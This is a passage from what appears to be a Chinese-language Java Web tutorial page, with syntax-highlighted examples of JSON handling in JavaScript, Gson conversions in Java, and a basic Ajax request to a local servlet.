punctuation">]</span> <span class="token comment" spellcheck="true">// json 数</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-js"><code class="language-js">    <span class="token keyword">var</span> jsons <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">"key1"</span><span class="token punctuation">:</span><span class="token string">"abc"</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 字符串类型</span>            <span class="token string">"key2"</span><span class="token punctuation">:</span><span class="token number">1234</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// Number</span>            <span class="token string">"key3"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token number">1234</span><span class="token punctuation">,</span><span class="token string">"21341"</span><span class="token punctuation">,</span><span class="token string">"53"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 数组</span>            <span class="token string">"key4"</span><span class="token punctuation">:</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// json 类型</span>        <span class="token string">"key4_1"</span> <span class="token punctuation">:</span> <span class="token number">12</span><span class="token punctuation">,</span>                <span class="token string">"key4_2"</span> <span class="token punctuation">:</span> <span class="token string">"kkk"</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token string">"key5"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// json 数组</span>        <span class="token string">"key5_1_1"</span> <span class="token punctuation">:</span> <span class="token number">12</span><span class="token punctuation">,</span>                <span class="token string">"key5_1_2"</span> <span class="token punctuation">:</span> <span class="token string">"abc"</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span>        <span class="token string">"key5_2_1"</span> <span class="token punctuation">:</span> <span class="token number">41</span><span class="token punctuation">,</span>                <span class="token string">"key5_2_2"</span> <span class="token punctuation">:</span> <span class="token string">"bbj"</span>    <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="JSON-对象的访问"><a href="#JSON-对象的访问" class="headerlink" title="JSON 对象的访问"></a>JSON 对象的访问</h5><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script <span class="token operator">></span>    <span class="token function">alert</span><span class="token punctuation">(</span>jsons<span class="token punctuation">.</span>key1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// "abc"</span>    <span class="token comment" spellcheck="true">// 访问 json 的数组属性</span>    <span class="token function">alert</span><span class="token punctuation">(</span>jsons<span class="token punctuation">.</span>key3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// "21341"</span>    <span class="token comment" spellcheck="true">// 访问 json 的 json 属性</span>    <span class="token function">alert</span><span class="token punctuation">(</span>jsons<span class="token punctuation">.</span>key4<span class="token punctuation">.</span>key4_1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//12</span>    <span class="token comment" spellcheck="true">// 访问 json 的 json 数组</span>    <span class="token function">alert</span><span class="token punctuation">(</span>jsons<span class="token punctuation">.</span>key5<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>key5_1_2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//"abc"</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="JSON-中两个常用的方法。"><a href="#JSON-中两个常用的方法。" class="headerlink" title="JSON 中两个常用的方法。"></a>JSON 中两个常用的方法。</h4><p><img src="/2021/11/30/javaWeb/image-20211127211051541.png" alt="image-20211127211051541"></p><pre class="line-numbers language-js"><code class="language-js"><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span>    <span class="token comment" spellcheck="true">// 一个 json 对象</span>    <span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">"a"</span> <span class="token punctuation">:</span> <span class="token number">12</span><span class="token punctuation">,</span>            <span class="token string">"c"</span> <span class="token punctuation">:</span> <span class="token string">"str"</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 把 json 对象转换成为字符串对象</span><span class="token keyword">var</span> objStr <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//</span>        <span class="token function">alert</span><span class="token punctuation">(</span>objStr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 把 json 对象的字符串，转换成为 json 对象</span>        <span class="token keyword">var</span> jsonObj <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>objStr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">alert</span><span class="token punctuation">(</span>jsonObj<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="JSON-在-java-中的使用"><a href="#JSON-在-java-中的使用" class="headerlink" title="JSON 在 java 中的使用"></a>JSON 在 java 中的使用</h4><p>链接：<a href="https://pan.baidu.com/s/1AoiN_wtwaR3Uix_tjBTDPQ">https://pan.baidu.com/s/1AoiN_wtwaR3Uix_tjBTDPQ</a>  提取码：love</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>atguigu<span class="token punctuation">.</span>gson<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>ArrayList<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashMap<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>List<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Map<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>google<span class="token punctuation">.</span>gson<span class="token punctuation">.</span>Gson<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>google<span class="token punctuation">.</span>gson<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>TypeToken<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">GsonTest</span> <span class="token punctuation">{</span>        <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">{</span>            <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>            <span class="token keyword">private</span> String name<span class="token punctuation">;</span>            <span class="token keyword">public</span> <span class="token function">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">// TODO Auto-generated constructor stub</span>            <span class="token punctuation">}</span>            <span class="token keyword">public</span> <span class="token function">Person</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">,</span> String name<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>                <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> age<span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">public</span> String <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> name<span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token annotation punctuation">@Override</span>            <span class="token keyword">public</span> String <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token string">"Person [age="</span> <span class="token operator">+</span> age <span class="token operator">+</span> <span class="token string">", name="</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">"]"</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// 要把复杂的 json 字符串转换成为 java 对象。需要继承 TypeToken 类。</span><span class="token comment" spellcheck="true">// 并把返回的类型当成 TypeToken 的泛型注入</span>        <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">PersonType</span> <span class="token keyword">extends</span> <span class="token class-name">TypeToken</span><span class="token operator">&lt;</span>List<span class="token operator">&lt;</span>Person<span class="token operator">>></span> <span class="token punctuation">{</span>        <span class="token punctuation">}</span>                                <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">// json 操作，一定要先 new 一个 gson 对象。</span>            Gson gson <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Gson</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// java 对象--json</span>            Person person <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token string">"wzg168"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 把对象转成为 json 字符串</span>            String personjson <span class="token operator">=</span> gson<span class="token punctuation">.</span><span class="token function">toJson</span><span class="token punctuation">(</span>person<span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>personjson<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 把 json 字符串转换成为 java 对象</span>            Person p <span class="token operator">=</span> gson<span class="token punctuation">.</span><span class="token function">fromJson</span><span class="token punctuation">(</span>personjson<span class="token punctuation">,</span> Person<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 2、java 对象 list 集合和 json 的转换</span>            List<span class="token operator">&lt;</span>Person<span class="token operator">></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span>Person<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token number">10</span> <span class="token operator">*</span> i<span class="token punctuation">,</span> <span class="token string">"name-"</span> <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            String jsonListString <span class="token operator">=</span> gson<span class="token punctuation">.</span><span class="token function">toJson</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>jsonListString<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 把 json 数组转换成为 List 对象</span><span class="token comment" spellcheck="true">// List&lt;Person> ps = gson.fromJson(jsonListString, new PersonType().getType());</span><span class="token comment" spellcheck="true">// 我们也可以使用匿名内部类</span>            List<span class="token operator">&lt;</span>Person<span class="token operator">></span> ps <span class="token operator">=</span> gson<span class="token punctuation">.</span><span class="token function">fromJson</span><span class="token punctuation">(</span>jsonListString<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TypeToken</span><span class="token operator">&lt;</span>List<span class="token operator">&lt;</span>Person<span class="token operator">>></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>ps<span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 3、map 对象和 json 的转换</span>            Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Person<span class="token operator">></span> mapPerson <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Person<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 添加 person 到 map 中</span>            mapPerson<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"p1"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"person-1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            mapPerson<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"p2"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"person-2"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 把 map 转换成为 json 对象</span>            String jsonMapString <span class="token operator">=</span> gson<span class="token punctuation">.</span><span class="token function">toJson</span><span class="token punctuation">(</span>mapPerson<span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>jsonMapString<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 通过使用匿名内部类的方式</span>            Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Person<span class="token operator">></span> map <span class="token operator">=</span> gson<span class="token punctuation">.</span><span class="token function">fromJson</span><span class="token punctuation">(</span>jsonMapString<span class="token punctuation">,</span>                    <span class="token keyword">new</span> <span class="token class-name">TypeToken</span><span class="token operator">&lt;</span>HashMap<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Person<span class="token operator">>></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>map<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Ajax"><a href="#Ajax" class="headerlink" title="Ajax"></a>Ajax</h3><p><img src="/2021/11/30/javaWeb/image-20211127211228882.png" alt="image-20211127211228882"></p><h4 id="Ajax的实现"><a href="#Ajax的实现" class="headerlink" title="Ajax的实现"></a>Ajax的实现</h4><p>1）html页面</p><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>pragma<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>no-cache<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>cache-control<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>no-cache<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Expires<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html; charset<span class="token punctuation">=</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Insert title here<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">         <span class="token keyword">function</span> <span class="token function">ajaxRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//              1、我们首先要创建XMLHttpRequest</span>            <span class="token keyword">var</span> xmlHttpRequest <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//              2、调用open方法设置请求参数</span>            xmlHttpRequest<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span><span class="token string">"http://localhost:8080//16_json_ajax_i18n/ajaxServlet?action=javaScriptAjax"</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//              4、在send方法前绑定onreadystatechange事件，处理请求完成后的操作。</span>            xmlHttpRequest<span class="token punctuation">.</span>onreadystatechange <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>               <span class="token keyword">if</span> <span class="token punctuation">(</span>xmlHttpRequest<span class="token punctuation">.</span>readyState <span class="token operator">==</span> <span class="token number">4</span> <span class="token operator">&amp;&amp;</span> xmlHttpRequest<span class="token punctuation">.</span>status <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                  <span class="token keyword">var</span> jsonObj <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>xmlHttpRequest<span class="token punctuation">.</span>responseText<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment" spellcheck="true">//把相应的数据放到页面上</span>                  document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"div01"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"编号"</span> <span class="token operator">+</span> jsonObj<span class="token punctuation">.</span>id <span class="token operator">+</span> <span class="token string">"姓名: "</span> <span class="token operator">+</span> jsonObj<span class="token punctuation">.</span>name<span class="token punctuation">;</span>               <span class="token punctuation">}</span>            <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//              3、调用send方法发送请求</span>            xmlHttpRequest<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ajaxRequest()<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>ajax request<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div01<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2）创建一个 AjaxServlet 程序接收请</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>haozai<span class="token punctuation">.</span>servlet<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>google<span class="token punctuation">.</span>gson<span class="token punctuation">.</span>Gson<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>haozai<span class="token punctuation">.</span>bean<span class="token punctuation">.</span>Person<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>ServletException<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HttpServletRequest<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HttpServletResponse<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * @author jackliu * @create 2021-07-12 10:11 */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AjaxServlet</span> <span class="token keyword">extends</span> <span class="token class-name">BaseServlet</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">javaScriptAjax</span><span class="token punctuation">(</span>HttpServletRequest req<span class="token punctuation">,</span> HttpServletResponse resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Ajax请求过来啦"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Person person <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"嘻嘻"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Gson gson <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Gson</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String personJson <span class="token operator">=</span> gson<span class="token punctuation">.</span><span class="token function">toJson</span><span class="token punctuation">(</span>person<span class="token punctuation">)</span><span class="token punctuation">;</span>        resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>personJson<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">jQueryAjax</span><span class="token punctuation">(</span>HttpServletRequest req<span class="token punctuation">,</span> HttpServletResponse resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Jquery请求来啦"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Person person <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"我是ajax"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Gson gson <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Gson</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String s <span class="token operator">=</span> gson<span class="token punctuation">.</span><span class="token function">toJson</span><span class="token punctuation">(</span>person<span class="token punctuation">)</span><span class="token punctuation">;</span>        resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">jQueryAjaxGet</span><span class="token punctuation">(</span>HttpServletRequest req<span class="token punctuation">,</span> HttpServletResponse resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"JqueryGet请求来啦"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Person person <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"我是ajaxGet"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Gson gson <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Gson</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String s <span 